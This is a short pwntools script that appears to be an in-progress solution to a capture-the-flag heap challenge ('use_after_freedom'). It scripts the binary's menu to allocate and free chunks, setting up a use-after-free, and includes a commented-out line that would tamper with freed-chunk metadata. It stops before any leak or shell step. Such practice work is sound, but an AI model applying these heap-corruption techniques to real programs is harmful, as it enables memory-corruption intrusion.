from pwn import *

e = ELF("./use_after_freedom")
libc = ELF("./libc.so.6")

context.binary = e.path

is_remote = "--remote" in sys.argv
def debug():
  if not is_remote:
    gdb.attach(p)

if is_remote:
  p = remote("use-after-freedom.hsc.tf", 1337)
else:
  p = process(e.path)
  #, env={"LD_PRELOAD": libc.path})

prompt = "Exit\n> "

def alloc(sz, data="AAAA"):
  p.sendline("1")
  p.sendlineafter(">", str(sz))
  p.sendafter(">", data)

  p.recvuntil(prompt)

def edit(idx, data="AAAA"):
  p.sendline("3")
  p.sendlineafter(">", str(idx))
  p.sendafter(">", data)

  p.recvuntil(prompt)

def free(idx):
  p.sendline("2")
  p.sendlineafter(">", str(idx))

  p.recvuntil(prompt)

p.recvuntil(prompt)

debug()

alloc(0x500 - 8)
alloc(0x400 - 8)
alloc(0x500 - 8)
alloc(0x500 - 8)

free(0)
free(2)

#edit(2, p64(0) + p64(0x1337))

p.interactive()
